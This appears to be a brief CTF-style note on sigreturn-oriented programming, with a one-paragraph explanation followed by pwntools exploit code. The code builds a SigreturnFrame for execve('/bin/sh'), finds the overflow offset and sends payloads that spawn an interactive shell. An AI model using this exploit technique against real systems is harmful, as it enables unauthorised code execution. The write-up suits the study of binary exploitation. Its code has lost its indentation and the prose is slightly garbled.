
# Sigreturn

After a call to sigreturn, the sigreturn signal is send, the kernel puts on the stack the current context and calls the signal handler. It then returns the execution with the saved context.
We can put the context ourself in the stack to get the process control flow.


```python
srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = motivation_letter
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
rop2 = b"/bin/sh\x00"
rop2 += p64(xor_rax_inc_al)
rop2 += p64(inc_al) * 0xe
rop2 += p64(syscall)
rop2 += bytes(srop_frame)
```

```python
def find_offset(io):
io.sendline(cyclic(0x100))
io.wait()

pid = io.__getattr__('pid')
corefile = f'{exe.path}.{pid}'
core = Coredump(corefile)
os.remove(corefile)

io.close()
return cyclic_find(core.fault_addr) #cyclic_find(core.rip/eip)

write_no_rdx = 0x400163
syscall = 0x4000ff
main = 0x400102
ret = 0x400101
hello_str = 0x600197
_read = 0x400135
main_no_sub = 0x400106

# find offset
#io = process([exe.path])

#io.readuntil(b'name : ')
offset = 15 #find_offset(io)
print(f'Offset = {hex(offset)}')

io = start()

context.clear()
context.arch = "amd64"

#srop
srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = hello_str
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
srop1 = bytes(srop_frame)

print(srop_frame)

print(hex(len(srop1)))

print(io.readuntil(b'name : '))
io.sendline(cyclic(offset) + p64(main) + cyclic(0x18) + srop1)

print(io.readuntil(b'name : '))
payload = cyclic(offset) + p64(syscall) + p64(syscall) + p64(syscall)
print(hex(len(payload)))
io.sendline(payload)

sleep(0.2)
io.sendline(cyclic(0xf-2) + b'\4')

io.interactive()

if args.SSH:
s.download("/tmp/flag")
```